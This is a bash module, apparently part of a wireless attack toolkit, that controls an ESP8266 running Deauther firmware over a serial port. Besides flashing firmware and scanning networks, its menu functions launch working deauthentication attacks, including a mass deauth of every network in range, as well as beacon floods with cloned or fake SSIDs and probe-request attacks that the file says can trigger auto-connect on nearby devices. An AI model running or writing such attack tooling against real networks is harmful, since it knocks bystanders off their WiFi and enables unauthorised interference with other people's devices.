#!/bin/bash

# ESP8266 Deauther module - Serial Command Integration
# Supports Spacehuhn ESP8266 Deauther firmware (v2.x)
# Serial commands: scan, show, select, deauth, beacon, probe, stop, sysinfo, etc.

# Default serial settings
ESP8266_PORT="${ESP8266_PORT:-/dev/ttyUSB0}"
ESP8266_BAUD="${ESP8266_BAUD:-115200}"
ESP_SSID_FILE="${AIRWINGS_DIR:-$(dirname "$0")/..}/data/esp_ssids.txt"

# ══════════════════════════════════════════════════════════════════════════════
# Serial Communication Engine
# ══════════════════════════════════════════════════════════════════════════════

# Auto-detect ESP8266 serial port
esp_detect_port() {
    local detected=""

    for port in /dev/ttyUSB* /dev/ttyACM*; do
        [[ -e "$port" ]] || continue

        # Configure port and try to get a response
        stty -F "$port" "$ESP8266_BAUD" cs8 -cstopb -parenb raw -echo 2>/dev/null || continue

        # Send empty line to wake up, then sysinfo
        printf "\r\n" > "$port" 2>/dev/null
        sleep 0.5
        printf "sysinfo\r\n" > "$port" 2>/dev/null

        local response
        response=$(timeout 3 cat "$port" 2>/dev/null)

        if echo "$response" | grep -qi "deauther\|spacehuhn\|ESP8266\|sdk\|channel"; then
            detected="$port"
            break
        fi
    done

    echo "$detected"
}

# Select or detect ESP8266 port interactively
esp_select_port() {
    local devices=()

    for port in /dev/ttyUSB* /dev/ttyACM*; do
        [[ -e "$port" ]] && devices+=("$port")
    done

    if [[ ${#devices[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No serial devices found${NC}"
        echo ""
        echo -e "${WHITE}Troubleshooting:${NC}"
        echo "  - Check USB connection"
        echo "  - Install drivers: CH340/CP2102"
        echo "  - Try different USB port"
        echo "  - Check permissions: sudo usermod -aG dialout \$USER"
        return 1
    fi

    echo -e "${WHITE}Available serial devices:${NC}"
    for i in "${!devices[@]}"; do
        local port="${devices[$i]}"
        local info=""

        # Try to identify device
        local usb_info=$(udevadm info --name="$port" 2>/dev/null | grep "ID_MODEL=" | cut -d= -f2)
        [[ -n "$usb_info" ]] && info=" ($usb_info)"

        echo -e "  ${CYAN}[$((i+1))]${NC} ${port}${info}"
    done
    echo ""

    if [[ ${#devices[@]} -eq 1 ]]; then
        ESP8266_PORT="${devices[0]}"
        echo -e "${GREEN}[✓] Auto-selected: $ESP8266_PORT${NC}"
    else
        read -p "Select device (1-${#devices[@]}): " choice
        if [[ "$choice" -ge 1 && "$choice" -le ${#devices[@]} ]] 2>/dev/null; then
            ESP8266_PORT="${devices[$((choice-1))]}"
            echo -e "${GREEN}[✓] Selected: $ESP8266_PORT${NC}"
        else
            echo -e "${RED}[!] Invalid selection${NC}"
            return 1
        fi
    fi

    return 0
}

# Send command to ESP8266 and capture response
esp_send_command() {
    local cmd="$1"
    local wait_time="${2:-3}"
    local port="${3:-$ESP8266_PORT}"

    if [[ ! -e "$port" ]]; then
        echo -e "${RED}[!] Device not connected: $port${NC}"
        return 1
    fi

    # Configure serial port
    stty -F "$port" "$ESP8266_BAUD" cs8 -cstopb -parenb raw -echo 2>/dev/null || {
        echo -e "${RED}[!] Failed to configure serial port${NC}"
        return 1
    }

    # Send command
    printf "${cmd}\r\n" > "$port" 2>/dev/null

    # Read response
    timeout "$wait_time" cat "$port" 2>/dev/null
}

# Send command and display output in real-time
esp_send_command_live() {
    local cmd="$1"
    local wait_time="${2:-5}"
    local port="${3:-$ESP8266_PORT}"

    if [[ ! -e "$port" ]]; then
        echo -e "${RED}[!] Device not connected: $port${NC}"
        return 1
    fi

    stty -F "$port" "$ESP8266_BAUD" cs8 -cstopb -parenb raw -echo 2>/dev/null || return 1

    printf "${cmd}\r\n" > "$port" 2>/dev/null

    # Stream output until timeout
    timeout "$wait_time" cat "$port" 2>/dev/null | while IFS= read -r line; do
        # Clean up the line (remove carriage returns)
        line=$(echo "$line" | tr -d '\r')
        [[ -z "$line" ]] && continue
        echo -e "${WHITE}  $line${NC}"
    done
}

# Check if ESP8266 is connected and responding
esp_check_connection() {
    local port="${1:-$ESP8266_PORT}"

    if [[ ! -e "$port" ]]; then
        return 1
    fi

    stty -F "$port" "$ESP8266_BAUD" cs8 -cstopb -parenb raw -echo 2>/dev/null || return 1

    # Flush input
    timeout 0.5 cat "$port" >/dev/null 2>&1

    printf "sysinfo\r\n" > "$port" 2>/dev/null

    local response
    response=$(timeout 3 cat "$port" 2>/dev/null)

    if echo "$response" | grep -qi "deauther\|spacehuhn\|ESP8266\|sdk\|channel\|mac"; then
        return 0
    fi

    return 1
}

# Verify connection before running attacks (used by all attack functions)
esp_require_connection() {
    if ! esp_check_connection "$ESP8266_PORT"; then
        echo -e "${RED}[!] ESP8266 not responding on $ESP8266_PORT${NC}"
        echo ""
        echo -e "${YELLOW}[*] Attempting auto-detection...${NC}"

        local detected=$(esp_detect_port)
        if [[ -n "$detected" ]]; then
            ESP8266_PORT="$detected"
            echo -e "${GREEN}[✓] Found ESP8266 on $ESP8266_PORT${NC}"
            return 0
        fi

        echo -e "${RED}[!] ESP8266 not found. Please check:${NC}"
        echo "  - USB connection"
        echo "  - Device is powered on"
        echo "  - Deauther firmware is flashed"
        return 1
    fi
    return 0
}

# ══════════════════════════════════════════════════════════════════════════════
# ESP8266 Menu
# ══════════════════════════════════════════════════════════════════════════════

esp8266_menu() {
    while true; do
        clear
        echo -e "${BLUE}┌─────────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${BLUE}│${WHITE}                 ESP8266 DEAUTHER                               ${BLUE}│${NC}"
        echo -e "${BLUE}├─────────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${BLUE}│ ${CYAN}[1]${WHITE}  Flash Firmware           ${GRAY}Program ESP8266 device         ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[2]${WHITE}  Serial Terminal          ${GRAY}Interactive serial console      ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[3]${WHITE}  Web Interface            ${GRAY}Access via browser              ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[4]${WHITE}  Scan Networks            ${GRAY}Scan APs and clients            ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[5]${WHITE}  Deauth Attack            ${GRAY}Disconnect devices              ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[6]${WHITE}  Beacon Flood             ${GRAY}Create fake APs                 ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[7]${WHITE}  Probe Request Attack     ${GRAY}Confuse nearby devices          ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[8]${WHITE}  SSID Manager             ${GRAY}Manage SSID lists               ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[9]${WHITE}  Device Info              ${GRAY}System info & status            ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[10]${WHITE} Select Port              ${GRAY}Change serial device            ${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[0]${WHITE}  Back to Main Menu        ${GRAY}Return                          ${BLUE}│${NC}"
        echo -e "${BLUE}└─────────────────────────────────────────────────────────────────┘${NC}"

        # Show connection status
        if [[ -e "$ESP8266_PORT" ]]; then
            echo -e "  ${GRAY}Port: $ESP8266_PORT @ ${ESP8266_BAUD}bps${NC}"
        else
            echo -e "  ${RED}No device connected${NC}"
        fi
        echo ""

        read -p "Select an option: " choice

        case $choice in
            1) esp_flash_firmware ;;
            2) esp_serial_terminal ;;
            3) esp_web_interface ;;
            4) esp_scan_networks ;;
            5) esp_deauth_attack ;;
            6) esp_beacon_flood ;;
            7) esp_probe_attack ;;
            8) esp_ssid_manager ;;
            9) esp_device_info ;;
            10) esp_select_port ;;
            0) break ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# ══════════════════════════════════════════════════════════════════════════════
# 1. Flash Firmware
# ══════════════════════════════════════════════════════════════════════════════

esp_flash_firmware() {
    clear
    echo -e "${BLUE}Flash ESP8266 Firmware${NC}"
    echo -e "${GRAY}=========================${NC}"

    if ! command -v esptool.py &>/dev/null && ! command -v esptool &>/dev/null; then
        echo -e "${RED}[!] esptool not found${NC}"
        echo -e "${YELLOW}[*] Install with: pip3 install esptool${NC}"
        pause
        return
    fi

    local esptool_cmd="esptool.py"
    command -v esptool.py &>/dev/null || esptool_cmd="esptool"

    # Find serial devices
    esp_select_port || { pause; return; }
    echo ""

    # Firmware selection
    echo -e "${WHITE}Firmware Options:${NC}"
    echo -e "${CYAN}[1]${NC} Download latest Deauther release (recommended)"
    echo -e "${CYAN}[2]${NC} Use local firmware file (.bin)"
    echo ""

    read -p "Select option: " fw_choice

    local firmware_file=""

    case $fw_choice in
        1)
            echo -e "${YELLOW}[*] Downloading latest Deauther firmware...${NC}"

            # Board selection
            echo ""
            echo -e "${WHITE}Select your board:${NC}"
            echo -e "${CYAN}[1]${NC} NodeMCU (most common)"
            echo -e "${CYAN}[2]${NC} D1 Mini / Wemos"
            echo -e "${CYAN}[3]${NC} ESP-12 Generic"
            echo ""
            read -p "Board type [1]: " board_choice
            board_choice="${board_choice:-1}"

            local board_name="NODEMCU"
            case $board_choice in
                2) board_name="D1_MINI" ;;
                3) board_name="ESP12" ;;
            esac

            local dl_url="https://github.com/SpacehuhnTech/esp8266_deauther/releases/latest/download/esp8266_deauther_2.6.1_${board_name}.bin"
            firmware_file="/tmp/esp8266_deauther.bin"

            if wget -q --show-progress -O "$firmware_file" "$dl_url" 2>/dev/null || curl -L -o "$firmware_file" "$dl_url" 2>/dev/null; then
                echo -e "${GREEN}[✓] Firmware downloaded${NC}"
            else
                echo -e "${RED}[!] Download failed. Check internet connection.${NC}"
                pause
                return
            fi
            ;;
        2)
            read -p "Enter path to firmware .bin file: " custom_fw
            if [[ -f "$custom_fw" ]]; then
                firmware_file="$custom_fw"
            else
                echo -e "${RED}[!] File not found: $custom_fw${NC}"
                pause
                return
            fi
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 1
            return
            ;;
    esac

    if [[ -z "$firmware_file" || ! -f "$firmware_file" ]]; then
        echo -e "${RED}[!] No firmware file available${NC}"
        pause
        return
    fi

    echo ""
    echo -e "${YELLOW}[!] Flash process will erase all data on the ESP8266${NC}"
    echo -e "${YELLOW}[!] Hold FLASH button → press RESET → release FLASH${NC}"
    echo ""
    read -p "Ready to flash? (y/N): " confirm

    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}[*] Erasing flash...${NC}"
        $esptool_cmd --port "$ESP8266_PORT" erase_flash

        echo ""
        echo -e "${YELLOW}[*] Writing firmware...${NC}"
        $esptool_cmd --port "$ESP8266_PORT" --baud 115200 write_flash -fm dout 0x0 "$firmware_file"

        if [[ $? -eq 0 ]]; then
            echo ""
            echo -e "${GREEN}[✓] Firmware flashed successfully!${NC}"
            echo -e "${YELLOW}[*] Press RESET button on device${NC}"
            echo -e "${YELLOW}[*] Wait 5 seconds for boot, then use Serial Terminal to verify${NC}"
        else
            echo -e "${RED}[!] Flash failed. Try again or check connections.${NC}"
        fi
    fi

    # Cleanup downloaded firmware
    [[ "$firmware_file" == "/tmp/"* ]] && rm -f "$firmware_file"

    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# 2. Serial Terminal
# ══════════════════════════════════════════════════════════════════════════════

esp_serial_terminal() {
    clear
    echo -e "${BLUE}ESP8266 Serial Terminal${NC}"
    echo -e "${GRAY}========================${NC}"

    if [[ ! -e "$ESP8266_PORT" ]]; then
        echo -e "${RED}[!] No device on $ESP8266_PORT${NC}"
        esp_select_port || { pause; return; }
    fi

    echo -e "${YELLOW}[*] Opening serial terminal on $ESP8266_PORT (${ESP8266_BAUD}bps)${NC}"
    echo ""

    if command -v screen &>/dev/null; then
        echo -e "${YELLOW}[*] Using 'screen' - Press Ctrl+A then K to exit${NC}"
        echo ""
        sleep 1
        screen "$ESP8266_PORT" "$ESP8266_BAUD"
    elif command -v minicom &>/dev/null; then
        echo -e "${YELLOW}[*] Using 'minicom' - Press Ctrl+A then X to exit${NC}"
        echo ""
        sleep 1
        minicom -D "$ESP8266_PORT" -b "$ESP8266_BAUD"
    elif command -v picocom &>/dev/null; then
        echo -e "${YELLOW}[*] Using 'picocom' - Press Ctrl+A then Ctrl+X to exit${NC}"
        echo ""
        sleep 1
        picocom -b "$ESP8266_BAUD" "$ESP8266_PORT"
    else
        echo -e "${YELLOW}[!] No terminal emulator found. Using basic serial I/O.${NC}"
        echo -e "${YELLOW}[*] Type commands and press Enter. Type 'exit' to quit.${NC}"
        echo ""

        stty -F "$ESP8266_PORT" "$ESP8266_BAUD" cs8 -cstopb -parenb raw -echo 2>/dev/null

        # Start background reader
        cat "$ESP8266_PORT" 2>/dev/null &
        local reader_pid=$!

        while true; do
            read -r cmd
            [[ "$cmd" == "exit" ]] && break
            printf "${cmd}\r\n" > "$ESP8266_PORT" 2>/dev/null
        done

        kill $reader_pid 2>/dev/null
        wait $reader_pid 2>/dev/null
    fi

    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# 3. Web Interface
# ══════════════════════════════════════════════════════════════════════════════

esp_web_interface() {
    clear
    echo -e "${BLUE}ESP8266 Web Interface${NC}"
    echo -e "${GRAY}======================${NC}"
    echo ""
    echo -e "${WHITE}Steps to access the Deauther web interface:${NC}"
    echo ""
    echo -e "${CYAN}1.${NC} Connect to the ESP8266 WiFi network:"
    echo -e "   SSID: ${WHITE}pwned${NC}  (default)"
    echo -e "   Password: ${WHITE}deauther${NC}  (default)"
    echo ""
    echo -e "${CYAN}2.${NC} Open browser and go to:"
    echo -e "   ${WHITE}http://192.168.4.1${NC}"
    echo ""
    echo -e "${CYAN}3.${NC} Accept the disclaimer to access controls"
    echo ""

    # Test connectivity if on the right network
    if ip route 2>/dev/null | grep -q "192.168.4."; then
        if ping -c 1 -W 2 192.168.4.1 &>/dev/null; then
            echo -e "${GREEN}[✓] ESP8266 is reachable at 192.168.4.1${NC}"

            if command -v xdg-open &>/dev/null; then
                read -p "Open in browser? (Y/n): " open_browser
                if [[ ! "$open_browser" =~ ^[Nn]$ ]]; then
                    xdg-open http://192.168.4.1 2>/dev/null &
                fi
            fi
        else
            echo -e "${YELLOW}[!] On correct network but ESP8266 not responding${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Not connected to ESP8266 WiFi network${NC}"
        echo -e "${YELLOW}[!] Connect to 'pwned' network first${NC}"
    fi

    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# 4. Scan Networks (via serial)
# ══════════════════════════════════════════════════════════════════════════════

esp_scan_networks() {
    clear
    echo -e "${BLUE}ESP8266 Network Scanner${NC}"
    echo -e "${GRAY}========================${NC}"

    esp_require_connection || { pause; return; }

    echo ""
    echo -e "${WHITE}Scan Options:${NC}"
    echo -e "${CYAN}[1]${NC} Scan Access Points"
    echo -e "${CYAN}[2]${NC} Scan Stations (clients)"
    echo -e "${CYAN}[3]${NC} Scan Both (AP + Stations)"
    echo -e "${CYAN}[4]${NC} Show last scan results"
    echo ""

    read -p "Select option: " scan_choice

    case $scan_choice in
        1)
            echo -e "${YELLOW}[*] Scanning for access points...${NC}"
            echo -e "${GRAY}(This takes ~5 seconds)${NC}"
            echo ""
            esp_send_command_live "scan -ap" 10
            ;;
        2)
            echo -e "${YELLOW}[*] Scanning for stations...${NC}"
            echo -e "${GRAY}(This takes ~15 seconds)${NC}"
            echo ""
            esp_send_command_live "scan -st" 20
            ;;
        3)
            echo -e "${YELLOW}[*] Scanning APs and stations...${NC}"
            echo -e "${GRAY}(This takes ~20 seconds)${NC}"
            echo ""
            esp_send_command_live "scan -ap -st" 25
            ;;
        4)
            echo -e "${YELLOW}[*] Retrieving last scan results...${NC}"
            echo ""
            echo -e "${WHITE}--- Access Points ---${NC}"
            esp_send_command_live "show aps" 5
            echo ""
            echo -e "${WHITE}--- Stations ---${NC}"
            esp_send_command_live "show stations" 5
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 1
            return
            ;;
    esac

    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# 5. Deauth Attack (via serial)
# ══════════════════════════════════════════════════════════════════════════════

esp_deauth_attack() {
    clear
    echo -e "${BLUE}ESP8266 Deauth Attack${NC}"
    echo -e "${GRAY}======================${NC}"

    esp_require_connection || { pause; return; }

    echo ""
    echo -e "${WHITE}Deauth Options:${NC}"
    echo -e "${CYAN}[1]${NC} Scan & select targets"
    echo -e "${CYAN}[2]${NC} Deauth all scanned APs"
    echo -e "${CYAN}[3]${NC} Deauth by AP index"
    echo -e "${CYAN}[4]${NC} Stop current attack"
    echo ""

    read -p "Select option: " choice

    case $choice in
        1)
            echo -e "${YELLOW}[*] Scanning for targets...${NC}"
            esp_send_command_live "scan -ap" 10

            echo ""
            echo -e "${YELLOW}[*] Showing available APs:${NC}"
            esp_send_command_live "show aps" 5

            echo ""
            read -p "Enter AP index to target (or 'all'): " target

            if [[ "$target" == "all" ]]; then
                echo -e "${YELLOW}[*] Selecting all APs...${NC}"
                esp_send_command "select -all" 2
            else
                echo -e "${YELLOW}[*] Selecting AP $target...${NC}"
                esp_send_command "select -ap $target" 2
            fi

            echo ""
            echo -e "${RED}[*] Starting deauth attack...${NC}"
            echo -e "${YELLOW}[*] Attack will run until stopped${NC}"
            esp_send_command "attack -deauth" 2

            echo ""
            echo -e "${GREEN}[✓] Deauth attack started${NC}"
            echo -e "${YELLOW}[*] Press Enter to stop...${NC}"
            read

            esp_send_command "stop" 2
            echo -e "${GREEN}[✓] Attack stopped${NC}"
            ;;
        2)
            echo -e "${RED}[!] WARNING: This will deauth ALL networks in range${NC}"
            read -p "Continue? (y/N): " confirm
            if [[ "$confirm" =~ ^[Yy]$ ]]; then
                echo -e "${YELLOW}[*] Scanning...${NC}"
                esp_send_command "scan -ap" 8 >/dev/null
                sleep 1

                esp_send_command "select -all" 2 >/dev/null
                echo -e "${RED}[*] Starting mass deauth...${NC}"
                esp_send_command "attack -deauth" 2

                echo -e "${GREEN}[✓] Deauth attack running${NC}"
                echo -e "${YELLOW}[*] Press Enter to stop...${NC}"
                read

                esp_send_command "stop" 2
                echo -e "${GREEN}[✓] Attack stopped${NC}"
            fi
            ;;
        3)
            read -p "Enter AP index number: " ap_index
            if [[ "$ap_index" =~ ^[0-9]+$ ]]; then
                esp_send_command "select -ap $ap_index" 2
                echo -e "${RED}[*] Starting deauth on AP $ap_index...${NC}"
                esp_send_command "attack -deauth" 2

                echo -e "${GREEN}[✓] Deauth attack running${NC}"
                echo -e "${YELLOW}[*] Press Enter to stop...${NC}"
                read

                esp_send_command "stop" 2
                echo -e "${GREEN}[✓] Attack stopped${NC}"
            else
                echo -e "${RED}[!] Invalid index${NC}"
            fi
            ;;
        4)
            echo -e "${YELLOW}[*] Stopping attack...${NC}"
            esp_send_command "stop" 2
            echo -e "${GREEN}[✓] Attack stopped${NC}"
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            ;;
    esac

    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# 6. Beacon Flood (via serial)
# ══════════════════════════════════════════════════════════════════════════════

esp_beacon_flood() {
    clear
    echo -e "${BLUE}ESP8266 Beacon Flood${NC}"
    echo -e "${GRAY}=====================${NC}"

    esp_require_connection || { pause; return; }

    echo ""
    echo -e "${WHITE}Beacon Flood Options:${NC}"
    echo -e "${CYAN}[1]${NC} Random SSIDs"
    echo -e "${CYAN}[2]${NC} Custom SSID list"
    echo -e "${CYAN}[3]${NC} Clone nearby APs"
    echo -e "${CYAN}[4]${NC} Single SSID flood"
    echo -e "${CYAN}[5]${NC} Stop current attack"
    echo ""

    read -p "Select option: " choice

    case $choice in
        1)
            echo -e "${YELLOW}[*] Enabling random beacon mode...${NC}"
            esp_send_command "enable random $ESP8266_BAUD" 2
            echo -e "${RED}[*] Starting beacon flood with random SSIDs...${NC}"
            esp_send_command "attack -beacon" 2

            echo -e "${GREEN}[✓] Beacon flood running (random SSIDs)${NC}"
            echo -e "${YELLOW}[*] Press Enter to stop...${NC}"
            read

            esp_send_command "stop" 2
            esp_send_command "disable random" 2
            echo -e "${GREEN}[✓] Attack stopped${NC}"
            ;;
        2)
            echo -e "${YELLOW}[*] Enter SSIDs (one per line, empty line to finish):${NC}"
            local ssid_count=0

            # Clear existing SSID list on device
            esp_send_command "remove names -all" 2 >/dev/null

            while true; do
                read -p "  SSID: " ssid_input
                [[ -z "$ssid_input" ]] && break

                esp_send_command "add ssid \"$ssid_input\"" 2 >/dev/null
                ssid_count=$((ssid_count + 1))
                echo -e "  ${GREEN}[+] Added: $ssid_input${NC}"
            done

            if [[ $ssid_count -gt 0 ]]; then
                echo ""
                echo -e "${RED}[*] Starting beacon flood with $ssid_count SSIDs...${NC}"
                esp_send_command "attack -beacon" 2

                echo -e "${GREEN}[✓] Beacon flood running${NC}"
                echo -e "${YELLOW}[*] Press Enter to stop...${NC}"
                read

                esp_send_command "stop" 2
                echo -e "${GREEN}[✓] Attack stopped${NC}"
            else
                echo -e "${YELLOW}[!] No SSIDs added${NC}"
            fi
            ;;
        3)
            echo -e "${YELLOW}[*] Scanning nearby APs to clone...${NC}"
            esp_send_command_live "scan -ap" 10

            echo ""
            echo -e "${YELLOW}[*] Cloning all scanned APs for beacon flood...${NC}"
            esp_send_command "select -all" 2 >/dev/null

            echo -e "${RED}[*] Starting beacon flood with cloned SSIDs...${NC}"
            esp_send_command "attack -beacon" 2

            echo -e "${GREEN}[✓] Beacon flood running (cloned APs)${NC}"
            echo -e "${YELLOW}[*] Press Enter to stop...${NC}"
            read

            esp_send_command "stop" 2
            echo -e "${GREEN}[✓] Attack stopped${NC}"
            ;;
        4)
            read -p "Enter SSID to flood: " flood_ssid
            if [[ -n "$flood_ssid" ]]; then
                esp_send_command "remove names -all" 2 >/dev/null
                esp_send_command "add ssid \"$flood_ssid\"" 2 >/dev/null

                echo -e "${RED}[*] Flooding with SSID: $flood_ssid${NC}"
                esp_send_command "attack -beacon" 2

                echo -e "${GREEN}[✓] Beacon flood running${NC}"
                echo -e "${YELLOW}[*] Press Enter to stop...${NC}"
                read

                esp_send_command "stop" 2
                echo -e "${GREEN}[✓] Attack stopped${NC}"
            else
                echo -e "${RED}[!] No SSID provided${NC}"
            fi
            ;;
        5)
            echo -e "${YELLOW}[*] Stopping attack...${NC}"
            esp_send_command "stop" 2
            echo -e "${GREEN}[✓] Attack stopped${NC}"
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            ;;
    esac

    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# 7. Probe Request Attack (via serial)
# ══════════════════════════════════════════════════════════════════════════════

esp_probe_attack() {
    clear
    echo -e "${BLUE}ESP8266 Probe Request Attack${NC}"
    echo -e "${GRAY}=============================${NC}"

    esp_require_connection || { pause; return; }

    echo ""
    echo -e "${WHITE}This attack sends probe requests to confuse nearby devices${NC}"
    echo -e "${WHITE}and can trigger auto-connect on some targets.${NC}"
    echo ""
    echo -e "${WHITE}Options:${NC}"
    echo -e "${CYAN}[1]${NC} Probe with SSID list"
    echo -e "${CYAN}[2]${NC} Probe with scanned APs"
    echo -e "${CYAN}[3]${NC} Stop current attack"
    echo ""

    read -p "Select option: " choice

    case $choice in
        1)
            echo -e "${YELLOW}[*] Enter SSIDs for probe requests (empty line to finish):${NC}"
            esp_send_command "remove names -all" 2 >/dev/null
            local count=0

            while true; do
                read -p "  SSID: " probe_ssid
                [[ -z "$probe_ssid" ]] && break

                esp_send_command "add ssid \"$probe_ssid\"" 2 >/dev/null
                count=$((count + 1))
                echo -e "  ${GREEN}[+] Added: $probe_ssid${NC}"
            done

            if [[ $count -gt 0 ]]; then
                echo ""
                echo -e "${RED}[*] Starting probe attack with $count SSIDs...${NC}"
                esp_send_command "attack -probe" 2

                echo -e "${GREEN}[✓] Probe attack running${NC}"
                echo -e "${YELLOW}[*] Press Enter to stop...${NC}"
                read

                esp_send_command "stop" 2
                echo -e "${GREEN}[✓] Attack stopped${NC}"
            else
                echo -e "${YELLOW}[!] No SSIDs added${NC}"
            fi
            ;;
        2)
            echo -e "${YELLOW}[*] Scanning for APs to use in probe requests...${NC}"
            esp_send_command_live "scan -ap" 10

            echo ""
            esp_send_command "select -all" 2 >/dev/null
            echo -e "${RED}[*] Starting probe attack with scanned APs...${NC}"
            esp_send_command "attack -probe" 2

            echo -e "${GREEN}[✓] Probe attack running${NC}"
            echo -e "${YELLOW}[*] Press Enter to stop...${NC}"
            read

            esp_send_command "stop" 2
            echo -e "${GREEN}[✓] Attack stopped${NC}"
            ;;
        3)
            echo -e "${YELLOW}[*] Stopping attack...${NC}"
            esp_send_command "stop" 2
            echo -e "${GREEN}[✓] Attack stopped${NC}"
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            ;;
    esac

    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# 8. SSID Manager (via serial)
# ══════════════════════════════════════════════════════════════════════════════

esp_ssid_manager() {
    clear
    echo -e "${BLUE}ESP8266 SSID Manager${NC}"
    echo -e "${GRAY}======================${NC}"

    esp_require_connection || { pause; return; }

    echo ""
    echo -e "${WHITE}SSID Management:${NC}"
    echo -e "${CYAN}[1]${NC} View current SSIDs on device"
    echo -e "${CYAN}[2]${NC} Add SSID"
    echo -e "${CYAN}[3]${NC} Add multiple SSIDs"
    echo -e "${CYAN}[4]${NC} Remove all SSIDs"
    echo -e "${CYAN}[5]${NC} Load SSIDs from file"
    echo -e "${CYAN}[6]${NC} Save SSIDs to file"
    echo ""

    read -p "Select option: " choice

    case $choice in
        1)
            echo -e "${YELLOW}[*] SSIDs on device:${NC}"
            echo ""
            esp_send_command_live "show names" 5
            ;;
        2)
            read -p "Enter SSID to add: " new_ssid
            if [[ -n "$new_ssid" ]]; then
                esp_send_command "add ssid \"$new_ssid\"" 2
                echo -e "${GREEN}[✓] Added: $new_ssid${NC}"
            fi
            ;;
        3)
            echo -e "${YELLOW}[*] Enter SSIDs (empty line to finish):${NC}"
            local added=0
            while true; do
                read -p "  SSID: " ssid
                [[ -z "$ssid" ]] && break
                esp_send_command "add ssid \"$ssid\"" 2 >/dev/null
                added=$((added + 1))
                echo -e "  ${GREEN}[+] $ssid${NC}"
            done
            echo -e "${GREEN}[✓] Added $added SSIDs${NC}"
            ;;
        4)
            read -p "Remove all SSIDs? (y/N): " confirm
            if [[ "$confirm" =~ ^[Yy]$ ]]; then
                esp_send_command "remove names -all" 2
                echo -e "${GREEN}[✓] All SSIDs removed${NC}"
            fi
            ;;
        5)
            read -p "Enter path to SSID file (one per line): " ssid_file
            if [[ -f "$ssid_file" ]]; then
                local loaded=0
                while IFS= read -r line; do
                    line=$(echo "$line" | xargs) # trim
                    [[ -z "$line" || "$line" == "#"* ]] && continue
                    esp_send_command "add ssid \"$line\"" 1 >/dev/null
                    loaded=$((loaded + 1))
                    echo -e "  ${GREEN}[+] $line${NC}"
                done < "$ssid_file"
                echo -e "${GREEN}[✓] Loaded $loaded SSIDs from file${NC}"
            else
                echo -e "${RED}[!] File not found: $ssid_file${NC}"
            fi
            ;;
        6)
            local save_file="${ESP_SSID_FILE}"
            read -p "Save to [$save_file]: " custom_path
            [[ -n "$custom_path" ]] && save_file="$custom_path"

            mkdir -p "$(dirname "$save_file")"
            local output
            output=$(esp_send_command "show names" 5)
            echo "$output" > "$save_file"
            echo -e "${GREEN}[✓] SSIDs saved to $save_file${NC}"
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            ;;
    esac

    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# 9. Device Info (via serial)
# ══════════════════════════════════════════════════════════════════════════════

esp_device_info() {
    clear
    echo -e "${BLUE}ESP8266 Device Info${NC}"
    echo -e "${GRAY}====================${NC}"

    esp_require_connection || { pause; return; }

    echo ""
    echo -e "${WHITE}System Information:${NC}"
    echo -e "${GRAY}─────────────────────${NC}"
    esp_send_command_live "sysinfo" 5

    echo ""
    echo -e "${WHITE}Current Status:${NC}"
    echo -e "${GRAY}─────────────────────${NC}"
    echo -e "  Port: ${CYAN}$ESP8266_PORT${NC}"
    echo -e "  Baud: ${CYAN}$ESP8266_BAUD${NC}"

    # Show if any attack is running
    echo ""
    echo -e "${WHITE}Options:${NC}"
    echo -e "${CYAN}[1]${NC} Stop all attacks"
    echo -e "${CYAN}[2]${NC} Reboot device"
    echo -e "${CYAN}[3]${NC} Back"
    echo ""

    read -p "Select option: " info_choice

    case $info_choice in
        1)
            esp_send_command "stop" 2
            echo -e "${GREEN}[✓] All attacks stopped${NC}"
            sleep 1
            ;;
        2)
            echo -e "${YELLOW}[*] Rebooting ESP8266...${NC}"
            esp_send_command "reboot" 2
            echo -e "${GREEN}[✓] Reboot command sent${NC}"
            sleep 3
            ;;
        3) return ;;
    esac

    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Helper: Color constants fallback
# ══════════════════════════════════════════════════════════════════════════════

if [[ -z "$RED" ]]; then
    RED="\e[31m"
    GREEN="\e[32m"
    YELLOW="\e[33m"
    BLUE="\e[34m"
    CYAN="\e[36m"
    WHITE="\e[97m"
    GRAY="\e[90m"
    NC="\e[0m"
fi

if ! type pause &>/dev/null 2>&1; then
    pause() {
        read -rp "Press Enter to continue..." _tmp
    }
fi
